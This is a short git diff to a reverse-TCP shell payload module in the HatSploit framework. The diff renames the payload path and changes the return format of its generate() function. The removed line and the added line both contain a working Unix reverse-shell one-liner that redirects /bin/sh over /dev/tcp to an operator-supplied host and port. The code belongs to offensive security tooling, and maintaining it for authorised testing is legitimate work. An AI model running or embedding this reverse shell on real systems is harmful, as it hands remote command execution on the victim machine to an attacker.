@@ -29,7 +29,7 @@ from core.lib.payload import HatSploitPayload
 class HatSploitPayload(HatSploitPayload):
     details = {
         'Name': "Unix /bin/sh Reverse TCP",
-        'Payload': "unix/cmd/sh_reverse_tcp",
+        'Payload': "unix/generic/sh_reverse_tcp",
         'Authors': [
             'enty8080'
         ],
@@ -53,4 +53,4 @@ class HatSploitPayload(HatSploitPayload):
     
     def generate(self):
         local_host, local_port = self.parser.parse_options(self.options)
-        return f"/bin/sh &>/dev/tcp/{local_host}/{local_port} 0>&1"
+        return ("generic", f"/bin/sh &>/dev/tcp/{local_host}/{local_port} 0>&1")
